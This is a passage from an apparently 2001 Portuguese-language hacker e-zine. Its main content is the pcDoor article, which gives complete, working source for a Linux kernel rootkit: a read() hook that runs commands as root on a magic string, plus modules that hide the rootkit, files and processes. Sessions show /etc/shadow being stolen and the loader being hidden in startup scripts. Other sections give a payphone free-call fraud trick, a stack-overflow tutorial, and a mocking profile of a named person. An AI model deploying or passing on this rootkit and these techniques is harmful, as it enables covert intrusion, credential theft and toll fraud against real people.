mais novo dele, o xinetd (nao fui com a cara dele, prefiro o inetd mesmo)
ex: telnet (23), ftp (21), pop (110) e assim vai...
Bem, o bom de tudo e q qq provedor q se preze usa alguns desses servicos.
Ah, eh bom notar tb q qd a backdoor eh ativada pelo inetd o comando vai
ser executado duas vezes, nao sei porque mas tenho uma teoria... tipo,
um primeiro read() eh do inetd e o segundo read() eh do daemon,
no caso de quando eu rodei ele localmente para teste, pode ser do proprio
cliente telnet, ou do daemon que eu testei, como o ipop3d por exemplo, dai
o cmd eh executado 2 vezes, entao cuidado tb com o comando...

Pode usar servidores tcp standalone tipo o sendmail e o apache q sao
rodados separados do inetd, ai tah liberado pq o read soh vai ser chamado
uma vez... e como eu disse, a string magica e o comando quando colocados
no final de qq arquivo ou string a enviar via tcp/udp/icmp nao compromete
a secao pois serah invisivel ao programa...

O que isso significa na pratica? Bem, suponhamos que ela esteja rodando
num provedor xyz.com.br do paranah (mais precisamente em guarapuava,
no provedor que o Carti usa :P ) Entaum imagine a cena...

tty1:

[root@pchazard /root]# telnet serv.com.br 110
Trying serv.com.br...
Connected to serv.com.br.
Escape character is '^]'.
+OK POP3 serv.com.br v7.64 server ready
user mariapch_can_exec:cp /etc/shadow /home/httpd/html/shadow
+OK User name accepted, password please
pass ilovevibratorspch_can_exec:chmod a+rwx /home/httpd/html/shadow
-ERR Bad login

tty2:

[root@pchazard /root]# wget http://www.serv.com.br/shadow
--09:05:31--  http://www.serv.com.br:80/shadow
           => `shadow'
Connecting to www.serv.com.br:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 45,322 [text/plain]

   0K .......... .......... .......... .......... .....    100%   0:10 4.50K

09:05:31 (4.53 KB/s) - `shadow' saved [45322/45322]
[root@pchazard /root]#

de volta ao tty1:

[root@pchazard /root]# telnet serv.com.br 25
Trying serv.com.br...
Connected to serv.com.br.
Escape character is '^]'.
220 serv.com.br ESMTP Sendmail 8.11.4/8.11.4; Wed, 19 Sep 2001 21:37:33 -0400
nooppch_can_exec:rm /home/httpd/html/shadow
250 2.0.0 OK
quit
221 2.0.0 serv.com.br closing connection
Connection closed by foreign host.

[root@pchazard /root]# mail root@serv.com.br -s "pcHazard 0wns!!!" < shadow

    hehehe phear my t3kn33ks :-) o unico problema eh q tu vai ficar nos
    logs do apache :)


Bem, ainda sobre a ativacao da backdoor via TCP, temos um dilema que se
torna de certa forma ateh ironico, mas nao deixa de ser hilario a menos
q nao seja vc a vitima... bem, imaginem, ela tb pode ser ativada por um
e-mail q vc mandar pra qualquer um no servidor ou melhor ainda...
via IRC :) ai eh q a gente curte mesmo ... imagine enviar mensagens
em PRIVATE para, por exemplo, o admin do server q vc sabe qual eh o nick
(admin) e q tah no momento no knal #adms e nelas embutir os comandos q
serao executados na maquina do bastardo e q o cliente dele, por exemplo,
bitchX vai mostrar apenas a mensagem normal, sem os comandos !!!!!



           =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
                           Ativacao remota via UDP
           =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


   Bem, isso eh soh pra mostrar as milhares de maneiras de acionar a backdoor
   via tcp... e ha ainda um modo melhor, que eh via udp.
   Bem, apesar do contra, que eh q nao tem como ter certeza de q o pacote
   udp chegou lah, usar udp pra acionar a backdoor eh bom pq com pacotes
   udp vc pode mudar o ip de origem do pacote e mandar, por exemplo, prum
   servidor quake q teja rodando ou melhor ainda, pro named, q varios
   provedores deixam rodando... o esquema eh o mesmo, no conteudo do
   pacote udp vc joga a string magica e o comando o voilah !!!!
   

  .---------------.
  |    Esconder    `-----------------------------------------------.
  `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

   Bem, um bom backdoor alem de ter que possuir um facil acionamento, como
foi mostrado antes, ela deve tambem se tornar praticamente indetectavel ao
administrador do sistema, pra que possa rodar por longos anos no server
e que se reinicie automaticamente mesmo se for dado um restart no server...
Bem, a pcDoor tambem tratou disso, e eh ai q entra o

#define SENHA_HIDE "#pch_can_hide:"

que eh a senha que define quando parte de um arquivo irah se tornar
invisivel, mas ao inves da SENHA_EXEC, naum serah executada. Papai,
como podemos usar a string magica SENHA_HIDE para fazer com que o
modulo seja recarregado toda vez q o sistema for reiniciado e que mesmo
que o administrador deh um cat ou vi ou pico no arquivo de inicializacao
que usamos para carregar a backdoor ela nao seja encontrada ?!?
para variar, vamos aos exemplos :)

supondo que o linux do alvo (serv.com.br) seja um conectiva da vida
e que possua um diretorio chamado /etc/profile.d aonde ninguem costuma
mecher... eu posso estar enganado, pq agora eu toh de slack8 :)

[root@serv /root]# cd /etc/profile.d
[root@serv profile.d]# ls
dircolors.csh  lang.csh  less.csh  qt2.csh  which-2.csh
dircolors.sh   lang.sh   less.sh   qt2.sh   which-2.sh


 hmm.. vamos usar esse dircolors.sh entaum...


[root@serv profile.d]# echo "#pch_can_hide:" >> dircolors.sh
[root@serv profile.d]# echo "/sbin/insmod /usr/lib/module.o" >> dircolors.sh

 hmm.. serah q isso vai funfar? vamos ver...

[root@pchazard profile.d]# cat dircolors.sh
#!/bin/sh

eval `dircolors -b /etc/DIR_COLORS`


[root@pchazard profile.d]#

 heuaheuahu, parece q sim ;-)


   Pra completar, pode-se usar modulos extras, como por exemplo,
para esconder arquivos e processos que contenham uma certa string,
ae vc faz uma copia do /bin/sh prum arquivo com esse nome, ae qdo
vc rodar uma bindshell remota que use o novo shell, vai liberar
uma shell remota que serah invisivel ao ps, e tb eh util pra manter
um diretorio lah dentro com tua rootkit, tipo, sniffers, logs etc...
Anexo nesse issue tem tb um modulo pra isso, totalmente ripado do
rial.c, e no caso se vc gostar da ideia eh muito facil misturar o
hider.c ao pcdoor.c ... use a imaginacao :)


  .---------------.
  |    FAQ         `-----------------------------------------------.
  `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
 
 P: mas, espera ai! se ele ficar invisivel, como o sistema vai ler ele
 pra executar o comando insmod ???
 R: quando o sistema ligar, o modulo nao estarah carregado ainda. Por
 isso a string magica SENHA_HIDE comeca com um # (chamase sustenido =)
 pra servir de comentario no script e nao causar nenhuma msg de erro ;)
 Ai, algum script do /etc/rc.d vai executar o script dircolor.sh que
 carregarah o modulo fazendo com que o final do dircolors.sh se torne
 invisivel denovo para o admin... kra, eu devia me envergonhar :)

 P: mas ainda tem o lsmod, como eu faco pra tirar o pcDoor da lista do
 lsmod ?
 R: bem, ha duas maneiras:

   1. procure nos fontes dele a linha #undef AUTOHIDE e mude pra #define
   AUTOHIDE. Assim, ele irah por conta propria se remover da lista do lsmod.
   MAASSS, eu nao recomendo usa-la porque pode ser inseguro, por isso
   deixei desabilitado por default, mas se quiser arriscar, eh bem provavel
   que nao aconteca nada mas as vezes dah pau, pode sumir ao inves de soh
   o pcDoor uma porrada de modulo da lista, ai vai dar na cara...
   
   2. use o modulo cleaner.o para remove-lo da lista. Esse modulo faz parte
   do pacote adore by Stealth, e os fontes dele vao anexo na zine tb.
   Como usar-lo? Apos instalar o modulo do pcDoor SEM autohide vc dah um
   # insmod cleaner.o
   # rmmod cleaner
   e pronto, seguro e limpo :)

   Provavelmente funcionarah em todos os kernels 2.2, e provavelmente
   nao funcionarah nos kernels 2.4 :(


  .---------------.
  | Os fontes      `-----------------------------------------------.
  `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

<++> rk/pcdoor.c
/*
 * pcDoor v1.0
 *
 * Isso eh q eh e-commerce:
 * Faca o que voce tem que fazer sem sair de casa :-)
 *
 * 2001 by pcHazard <cybercrash@ig.com.br>
 * Greetz to all friends of #r00t in irc.brasnet.org:
 * struck, psaux, Carti, syscall, vh_, ^^VENTO^^, ozzy, chaos
 * Dave Mustaine, encripty, Kamikase Shell, chm0d, mph,
 * ReNeGaDe e especialmente para TheFaiRy =)
 * Extra thanks to Carti to help on testings =)
 * http://www.fatal3rror.com
 * with a lot of ripps from rial by techno[k],
 * adore by Stealth and knark by Creed
 *
 * Tested on:
 * Conectiva Linux 6 Kernel 2.2.17-14cl glibc 2.1.3.
 *
 * use ./gera.sh to compile
 *
 */

#define MODULE
#define __KERNEL__
#define __KERNEL_SYSCALLS__
#define MODVERSIONS

#include <asm/uaccess.h>
#include <asm/errno.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/smp_lock.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <sys/syscall.h>

#define debug(X) printk(KERN_DEBUG X)
#define SPACE_REPLACEMENT 254
#define SENHA_EXEC "pch_can_exec:"
#define SENHA_HIDE "#pch_can_hide:"

#define APAGATAG
#undef AUTOHIDE
#undef AVISA

struct execve_args {
    char *path;
    char **argv;
    char **envp;
};

extern void* sys_call_table[];
int errno;

int (*old_read)(unsigned int fd, char *buf, size_t count);

int do_exec_userprogram(void *data)
{
    int i;
    struct fs_struct *fs;
    struct execve_args *args = (struct execve_args *) data;
    
    lock_kernel();
    
    exit_fs(current);
    fs = init_task.fs;
    current->fs = fs;
    atomic_inc(&fs->count);
    
    unlock_kernel();
    
    for(i = 0; i < current->files->max_fds; i++)
	if(current->files->fd[i]) close(i);
    
    current->uid = current->euid = current->fsuid = 0;
    current->gid = current->egid = current->fsgid = 0;
    cap_set_full(current->cap_inheritable);
    cap_set_full(current->cap_effective);
    
    set_fs(KERNEL_DS);

    if(execve(args->path, args->argv, args->envp) < 0)
	return -1;

    return 0;
}


int execve_userprogram(char *path, char **argv, char **envp)
{
    static char *path_argv[2];
    static struct execve_args args;
    pid_t pid;
    static char *def_envp[] = { "HOME=/", "TERM=linux", 
      "PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin:"
	   "/usr/bin/X11", NULL  };
    
    if (path) args.path = path;
    else return -1;
    
    if (argv) args.argv = argv;
    else
    {
	path_argv[0] = path;
	path_argv[1] = NULL;
    }
    
    if (envp) args.envp = envp;
    else args.envp = def_envp;
    
    pid = kernel_thread(do_exec_userprogram, (void *)&args, CLONE_FS);
    if(pid == -1)
	return -1;
    return pid;
}


int new_read(unsigned int fd, char *buf, size_t count)
{
   char *tmp,*cmd;
   static char *argv[16];
   char *tmp1;
   char space_str[2];
   int r,i;

   r = (*old_read)(fd, buf, count);
   if(r <= 0)  return r;

   tmp=(char*)kmalloc(r+1,GFP_KERNEL);
   memset(tmp,0,r+1);
   cmd=(char*)kmalloc(r+1,GFP_KERNEL);
   memset(cmd,0,r+1);
   if((tmp==NULL)||(cmd==NULL)) return r;
   copy_from_user(tmp,buf,r);
   
   if ((tmp1=strstr(tmp,SENHA_EXEC)) != NULL)
   {
      sprintf(cmd,"/bin/sh%c-c%c%s",SPACE_REPLACEMENT,SPACE_REPLACEMENT,(tmp1+strlen(SENHA_EXEC)));
      for (i=0;i < strlen(cmd);i++)
      {
         if ((cmd[i] == 13) || (cmd[i] == 10))
         {
            cmd[i] = 0;
            break;
         }
      }

      #ifdef AVISA
         printk("[OK:%s]\n", cmd);
      #endif

      space_str[0] = SPACE_REPLACEMENT;
      space_str[1] = 0;
      for(i = 0; i < 16 && (argv[i] = strtok(i? NULL:cmd, space_str)) != NULL;
          i++);
      argv[i] = NULL;
      
      #ifdef APAGATAG
         sprintf(tmp1,"\n%c",0);
         r = strlen(tmp);
         copy_to_user(buf,tmp,r+1);
      #endif
      execve_userprogram(argv[0], argv, NULL);
   }
   else if ((tmp1=strstr(tmp,SENHA_HIDE)) != NULL)
   {
      sprintf(tmp1,"\n%c",0);
      r = strlen(tmp);
      copy_to_user(buf,tmp,r+1);
   }
   kfree(tmp);
   kfree(cmd);
   return r;
}

int init_module(void)
{
   EXPORT_NO_SYMBOLS;

   #ifdef AUTOHIDE
      struct module *m = &__this_module, *to_delete = NULL;
      
      to_delete = m->next;
      if (to_delete)
      {
         int i;
         m->name = to_delete->name;
         m->size = to_delete->size;
         m->flags = to_delete->flags;
	        
         for (i = 0; i < GET_USE_COUNT(to_delete)+1; i++) MOD_INC_USE_COUNT;
         m->next = to_delete->next;
      }
   #endif

   lock_kernel();
   old_read = sys_call_table[SYS_read];
   sys_call_table[SYS_read] = new_read;
   
   unlock_kernel();
   return 0;
}

void cleanup_module(void)
{
   lock_kernel();
   sys_call_table[SYS_read] = old_read;
   unlock_kernel();
}
<-->

<++> rk/cleaner.c
/*
 * Copyright (C) 1999/2000 Stealth.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 4. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#define __KERNEL__
#define MODULE

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>

int init_module()
{
	if (__this_module.next)
		__this_module.next = __this_module.next->next;

	return 0;
}

int cleanup_module()
{
	return 0;
}
<-->

<++> rk/hider.c
/*
 *
 *  Hider - esconde processos e arquivos que contenham
 *          a string definida em HIDESTR.
 *          Totalmente copiado do rial.c :-)
 *
 */

#define MODULE
#define __KERNEL__
#define __KERNEL_SYSCALLS__
#define MODVERSIONS

#include <asm/uaccess.h>
#include <asm/errno.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/smp_lock.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <sys/syscall.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>

#define HIDESTR "pchstuff"

extern void* sys_call_table[];
int errno;

int (*old_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

int myatoi(char *str)
{
 int res = 0;
 int mul = 1;
 char *ptr;
 for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
  if (*ptr < '0' || *ptr > '9')
   return (-1);
  res += (*ptr - '0') * mul;
  mul *= 10;
}
 return (res);
}

struct task_struct *get_task_structure(pid_t n)
{
 struct task_struct *tsp;

	tsp=current;
	do{
		if(tsp->pid==n)return tsp;		
		 tsp=tsp->next_task;	
	}while(tsp!=current);
	return NULL;
}

int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
   int hmr,hme,original_ret,left;
   struct dirent *d,*d2;
   struct inode *dinode;
   int ps=0, tohide;
   struct task_struct *tsp;

   if((original_ret=old_getdents(fd,dirp,count))==-1)return(-errno);
   #ifdef __LINUX_DCACHE_H
      dinode=current->files->fd[fd]->f_dentry->d_inode;
   #else
      dinode=current->files->fd[fd]->f_inode;
   #endif
   if (dinode->i_ino==PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev)==1) ps=1;

   d = (struct dirent *)kmalloc(original_ret,GFP_KERNEL);
   copy_from_user(d,dirp,original_ret);
   d2=d;
   left=original_ret;
   hme=0;
   while(left>0)
   {
      hmr=d2->d_reclen;
      left-=hmr;
      tohide=0;
      if (ps)
      {
         tsp=get_task_structure(myatoi(d2->d_name));
	 if((tsp!=NULL)&&(strstr(tsp->comm,HIDESTR)))tohide=1;
      }
      if((strstr((char*)d2->d_name,HIDESTR))||(tohide))
      {
         if (left > 0) memmove(d2,(char*)d2+hmr,left);
            else d2->d_off=1024;
 	 original_ret-=hmr;
      }
      else d2=(struct dirent*)((char*)d2+hmr);
   }
   copy_to_user(dirp,d,original_ret);
   kfree(d);
   return original_ret;
}

int init_module(void)
{
   EXPORT_NO_SYMBOLS;

   lock_kernel();
   
   //getdents()
   old_getdents = sys_call_table[SYS_getdents];
   sys_call_table[SYS_getdents] = new_getdents;

   unlock_kernel();
   return 0;
}

void cleanup_module(void)
{
   lock_kernel();
   sys_call_table[SYS_getdents] = old_getdents;
   unlock_kernel();
}
<-->

  .---------------.
  | E eh soh ...   `-----------------------------------------------.
  `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -


  Bem, e assim termina a odisseia do pcDoor, espero q tenham gostado
  do passeio e bom proveito do pcDoor, afinal eh de graca mesmo,
  apesar de ter custado milhares de resets na minha maquina :)
  
  Se naum for de mais, caso vcs encontrem algum bug ou tenham colocado
  mais funcoes interessantes nele, me passei o codigo novo :)

  sem stress...
  pcHazard

    Copyleft (cl) 19 Set 2001 21:44:34 by pcHazard <cybercrash@ig.com.br>










        _xXXXP^''                          ``^YXXXx_
     _xXXXXP~          09 - Free Call          ~YXXXXx_
  _xXXXXXX(                                      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                      )XXXXXXP~
     ~YXXXXb_               TPGA               _dXXXXP~
        ~YXXXbx..                          ..xdXXXP~


[1.0] Ligando Gratis de um TP com ajuda de um Cel

        Aqui estou mais uma vez ajudando essa galerinha a econimizar na contas
telefonicas, essa T3kn33k nao foi elaborada por mim e nem sei quem a elaborou,
descobri isso num chat com Rastermition no canal #Phreak da Brasnet e a pedido
do manow Struck resolvi disponibizar essa info para a f3 e todos seus leitores
deixando aqui registrado mais uma falha em nosso avancado sistema de Telefonia
Publica. Os testes foram feitos com aparelhos Nokia 6120, 5180, Erickson 668 e
Gradiente e nos TPs modelos Splice 9400 e Daruma TPC-200, TESTEM logo, pois a 
Telemerda ja anuciou que iria consertar o BUG.

[1.1] Glossario p/ leigos:

DTMF    (Tons emitidos na hora que pressionamos uma tecla do cel)
MIC     (Dispositivo onde vc fala)
SPEAKER (Dispositivo onde vc ouve)
TP      (Telefone Publico)
CEL     (Aparelho Celular) hehe...

[1.2] Como fazer???

        O esquema eh o seguinte, ligue do cel para o TP e espere chamar pelo
menos uma vez, depois aperte END p/ para cancelar a chamada,  nao eh preciso
que o TP toque. Remova o fone do TP do gancho, e veja que no display aparece
Ligacao Recebida, se tiver dado o TOM de linha, encoste o Speaker do cell no
MIC do TP, depois ligue pra onde voce quiser usando apenas as teclas do cell,
nao sera preciso apertar SEND. Quando terminar de discar pode desencostar o
Speaker do Mic, que os tons DTMF emitidos pelas teclas do cell, fara com que
o TP efetue sua ligacao. Pronto agora fale usando o fone do TP.

[1.3] Entedendo a Falha

     A hora em que voce aperta END (eh  isso a falha), a ligacao ainda demora
pra ser encerrada no sistema, quando vc tira o tel do gancho, o sistema ainda
entende que a ligacao esta sendo feita, por isso aparece ligacao recebida soh
que voce deu END e essa eh parte da falha, libera-se o tom de linha, por isso
voce pode discar quando o TP entende que a ligacao foi recebida.










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~   10 - Buffer Overwrite    ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat  Struck       _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


   Nesta materia demostrarei como facilmente pode-se causar um buffer 
overflow para sobrescrever outra variavel de um programa. Alem disso 
veremos algumas vantagens que podemos adquirir qdo exploitamos tal bug de 
tal maneira.

   Como sabemos, o maior furo da linguagem C esta em funcoes de sua 
biblioteca padrao que nao faz controle de tamanho das variaveis. Sendo 
assim sempre que alguma variavel recebe valor de tamanho maior do q ela 
suporta, a funcao continua escrevendo na memoria e sobrescrevendo o que 
vier depois.
   Esta eh a base dos exploits de b0f, onde enchem uma variavel com um 
conteudo maior do que o suportado para atingirem o endereco de retorno da 
funcao. Assim o programa altera seu fluxo de execucao e pode ser 
controlado.
   A tecnica de buffer overflow pode ser acompanhada nas 1as edicoes da 
f3 (00 e 01).
   Aqui nao vou retomar o assunto. Ao inves, demonstrarei como causar um 
b0f para sobrescrever outras areas da memoria que nao temos acesso, como 
strings constantes ou variaveis que nao sofrem influencia do usuario na 
execucao normal do programa.

   Para comecar, um bom pre-requesito seria o texto de alocacoes 
dinamicas da edicao passada. Aqui iremos tratar apenas com a plataforma 
unix. Sendo assim algumas informacoes deste texto talvez nao batam com 
outros OSs.

   Qdo um programa eh executado, ele a principio define espaco para suas 
variaveis antes de executar qquer outra funcao. Analizando o seguinte 
programa, percebemos como isso acontece.

<++> var/prog1.c
main() {
   char a[4];
}
<-->

# gcc prog1.c -oprog
# gdb prog
GNU gdb 5.0rh-5 Red Hat Linux 7.1
Copyright 2001 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) disass main
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %esp,%ebp
0x8048433 <main+3>:     sub    $0x4,%esp
0x8048436 <main+6>:     leave  
0x8048437 <main+7>:     ret    
0x8048438 <main+8>:     nop    
0x8048439 <main+9>:     nop    
0x804843a <main+10>:    nop    
0x804843b <main+11>:    nop    
0x804843c <main+12>:    nop    
0x804843d <main+13>:    nop    
0x804843e <main+14>:    nop    
0x804843f <main+15>:    nop    
End of assembler dump.
(gdb) q


   O programa acima nao faz nada, apenas cria uma variavel do tipo char 
na stack. Como ja foi falado em edicoes passadas, em hambientes linux 
variaveis do tipo static e dinamicas sao alocadas na heap, as demais ficam 
na stack (pilha).
   Analizando as primeiras linhas de execucao do programa temos:

0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %esp,%ebp
0x8048433 <main+3>:     sub    $0x4,%esp

   Nao eh preciso de um conhecimento mto aprofundado de asm para entender 
o que fazem esses comandos. 
   Mas se vc eh macaco entao soh precisa saber q aki eh jogado o valor de  
bp na stack para ser usado como return_addrs (sabe pra que serve neh?).
   Depois atualiza bp com o novo valor de sp (posicao atual da stack).
   Por fim diminue 4bytes de sp para indicar onde nossa string a comecara 
a ser gravada na stack.
   Lembre-se que dados salvos na stack obedecem a regra "ultimo a entrar 
eh o primeiro a sair". Sendo assim, o valor de bp fica no final da stack 
pois foi o primeiro a ser gravado.
   Ilustrando, ficaria assim:

   AAAAhhhh

   Onde AAAA = espaco para a variavel; hhhh = antigo bp;
   Por isso qdo colocamos mais dados do que o suportado pela variavel, 
atingimos o hhhh e alteramos o fluxo de execucao pois o programa usa este 
endereco para retornar de uma funcao. 
   Qdo o bp eh recuperado com o valor de hhhh os dados q foram salvos 
depois dele sao esquecidos e utilizados novamente em outras funcoes.

   Qdo uma variavel nao eh inicializada ela recebe o valor que ja estava 
na memoria. Veja a seguinte situacao:

<++> var/prog2.c
void f1();
void f2();

main() {
  f1();
  f2();
}

void f1() {
   char a[100]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
   printf("A=%s\n",a);
}
void f2() {
   char b[100];
   printf("B=%s\n",b);
}
<-->

   O programa acima eh muti simples... Primeiro a funcao f1() eh chamada.
Nela eh criado a variavel a com tamanho 100. Ela eh inicializada por uma
string somente de "A"s. Entao a funcao retorna, o valor da stack volta ao 
anterior. Qdo chamamos a funcao f2() ela ocupa o mesmo espaco na stack 
usado pela f1() pois possue somente uma variavel de mesmo tamanho.
   Como a variavel b na f2() nao foi inicializada, ela recebe o valor que 
ja se encontra na memoria. Rode o programa e veja o resultado.

# ./a.out
A=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
B=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

   Casos como estes sao pouco comuns e logo nao eh este o ponto alto desta 
materia. Vejamos o que acontece com 2 variaveis declaradas na mesma 
funcao....

<++> var/prog3.c
void f1();
main() {
  f1();
}

void f1() {
   char a[4],b[4];
   printf("Valor de A: "); gets(a);
   printf("Valor de B: "); gets(b);
   printf("A=%s\nB=%s\n",a,b);
}
<-->

   Entre com valores para A e B (lembre-se de que o gets() reserva o 
ultimo caractere da string para o valor 0).
   Vamos estudar o prog3...

# ./a.out
Valor de A: aaa
Valor de B: bbb
A=aaa
B=bbb

   Ateh aki tudo normal. Lembrando q o 4o caractere eh reservado para 0.
   Vamos forcar um overflow na variavel A...

# ./a.out
Valor de A: aaaaaaaaa
Valor de B: bbb
A=aaaaaaaaa
B=bbb
Segmentation fault (core dumped)

   Hm... Pelo visto sobrescrevemos o return address.
   Agora vamo testar a mesma coisa na variavel B...

# ./a.out
Valor de A: aaa
Valor de B: bbbbb
A=b
B=bbbbb

   Nao ocorreu sobrescrita no return address, porem ultrapassamos o limite 
da variavel B e atingimos a A. Isso pq a variavel A foi declarada antes da 
B ficando logo apos o Return Address. Graficamente ficou assim:

   BBBBAAAAhhhh

   Onde: AAAA = Espaco para a;
	 BBBB = Espaco para b;
	 hhhh = Return Address;

   Logo, podemos atingir o Return Address pela variavel B. Soh eh preciso 
sobrescrever toda a variavel A para isso. Por isso eh logicamente possivel 
inserir um shellcode em variaveis pequenas, desde que nao seja a unica do 
bloco a ser salva na stack e nao seja a 1a declarada.
   Outra opcao interessante para esta tekneek eh atingir constantes 
declaradas no mesmo bloco. Isso porque, em plataformas unix, constantes 
sao salvas na stack junto as variaveis. Sendo assim podemos atingir 
constantes usadas por system()'s, etc...

   Mas nao acaba aki...
   Teoricamente tambem eh possivel atingir o Return Addres de uma funcao, 
sobrecarregando uma variavel de sua sub funcao.
   Veja o proximo exemplo:


<++> var/prog4.c
void f1();
void f2();
void f3();

main() {
   f1();
}

void f1() {
   f2();
}

void f2() {
   char a[8];
   long *p = (long *)a;
   int i;

   for(i=0;i<4;i++)
     *(p++) = &f3;
}

void f3() { printf("Funcao 3 chamada!\n"); }
<-->

   Como vemos acima nao existe nenhuma chamada para a funcao f3() no 
codigo original do programa. Mas como reescrevemos o return address da 
funcao f2() com o endereco de f3(). Ao executarmos teremos:


# ./a.out
Funcao 3 chamada!
Segmentation fault (core dumped)


   Repare o laco for em q sobrecarregamos a variavel com o endereco de 
f3(). Ele repete a instrucao 4x para que possamos preencher toda a string 
e mais o Return Address da funcao f2();
   Troque o loop do programa acima por:

   for(i=0;i<5;i++)

   Execute e veja o que acontece...

# ./a.out
Funcao 3 chamada!
Funcao 3 chamada!
Funcao 3 chamada!
Segmentation fault (core dumped)

   A funcao f3 foi chamada 3x. Isso pq nos sobrescrevemos o return address 
de outras funcoes tb. 
   Veja passo a passo como o programa tratou da memoria:

-aloca na stack o return address para a shell;
-main(): aloca o return address para main();
-f1(): aloca o return address para f1();
-f1(): aloca espaco para variaveis do f2();

  Entao a stack nesse momento se parece com:

  CCCCMMMMFFFF[              ]

  Onde CCCC, MMMM e FFFF sao return address e o espaco entre []'s eh para 
as variaveis da funcao f2().
  Qdo estouramos os limites para as variaveis atingimos os demais return 
address com o endereco de f3(). Por isso ele eh executado varias vezes. Se 
carregarmos mais ainda a stack podemos atingir enderecos de retorno fora 
do nosso programa. Para testar isso, aumente o numero de loops que a 
funcao f2() faz e execute novamente o programa.

   Como tambem foi visto na f3-04 (materia do c0nd0r) tambem eh possivel
alterar variaveis carregadas na heap. Porem ao contrario da stack, na heap
os dados nao sao empilhados e sim armazenados do inicio para o fim.
Sendo assim, se declararmos 2 variaveis A e B assim:

static char A[4], B[4];

   Soh conseguiremos alterar a variavel B sobrecarregando a A e nao ao 
contrario (como ocorria na stack). Nao vou exemplificar novamente isto
pois voce pode encontrar na materia "Heap Overflow: exemplo simplicado"
da fatal 3rror 04.










/*
 *  Lembram de um loko q uma vez publicou os dados do psaux???
 *  Olha os dados dele publicados aki... =)
 */
- Nick: n4rfy
- Sexo: Homosexual assumido
- Tamanho do pe': 40
- Programa predileto: gcc
- Mouse: hum.. /dev/mouse
- Bebida: nescau
- Banho: "Só quando vou encontrar mulher"
- O que faz qdo ta cagando? Forca
- O q diz qdo toma um fora? "Va pra puta que pariu entao"
- Qual foi a maior loucura q ja fez?
   Ficar 6 dias sem durmir.
   E sair de cascavel pra vim pra curitiba com 15 reais no bolso.

        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~       11 - Celulares       ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
